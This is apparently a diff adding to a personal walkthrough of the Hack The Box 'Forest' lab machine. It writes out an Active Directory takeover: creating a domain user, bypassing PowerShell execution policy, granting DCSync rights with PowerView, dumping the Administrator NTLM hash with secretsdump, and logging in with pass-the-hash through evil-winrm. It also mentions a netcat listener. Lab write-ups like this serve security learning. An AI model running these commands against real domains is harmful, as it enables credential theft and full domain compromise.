@@ -75,4 +75,40 @@ evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161
 ```
 - got a shell
 - got user
-- 
+- Bloodhound shows the need to add a user to Exchange Windows Privilages so i added hacker with 
+```
+net user hacker password123 /add /domain
+```
+- Set up listener after dropping nc.exe that gives a powershell so hat I can use powerview
+- Bypass execution policy
+```
+Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
+```
+```
+Import-Module .\Powerview.ps1
+```
+```
+$SecPass = ConvertTo-SecureString 'password123' -AsPlainText -Force
+```
+```
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\hacker', $SecPass)
+```
+```
+Add-ObjectACL -PrincipalIdentity hacker -Credential $Cred -Rights DCSync
+```
+```
+python3 /opt/secretsdump.py 'hacker:password123@10.10.10.161' -just-dc-user Administrator -just-dc-ntlm
+```
+- Output
+```
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
+[*] Cleaning up... 
+```
+- Then login as administrator
+```
+evil-winrm -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6' -i 10.10.10.161
+```
